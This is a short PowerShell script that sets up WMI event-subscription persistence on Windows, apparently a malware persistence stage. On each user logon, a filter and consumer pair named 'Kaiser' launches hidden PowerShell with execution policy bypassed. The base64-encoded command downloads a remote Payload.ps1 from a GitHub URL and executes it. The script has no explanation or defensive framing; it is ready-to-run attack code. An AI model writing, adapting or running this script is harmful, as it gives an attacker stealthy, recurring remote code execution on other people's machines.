$cmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w Hidden ?ep Bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ATgB0AFIAYQBpAHMAZQBIAGEAcgBkAEUAcgByAG8AcgAvAEsAYQBpAHMAZQByAC8ASwBhAGkAcwBlAHIARABvAHcAbgBsAG8AYQBkAGUAcgBUAGUAcwB0AC8AUABhAHkAbABvAGEAZAAuAHAAcwAxACIAKQA='

$filterName='KaiserFilter'

$consumerName='KaiserConsumer'

$Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

$WMIEventFilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query=$Query}

$WMIEventConsumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName; CommandLineTemplate=$cmd}

Set-WmiInstance  -Class __FilterToConsumerBinding  -Namespace "root\subscription"  -Arguments @{Filter=$WMIEventFilter; Consumer=$WMIEventConsumer}
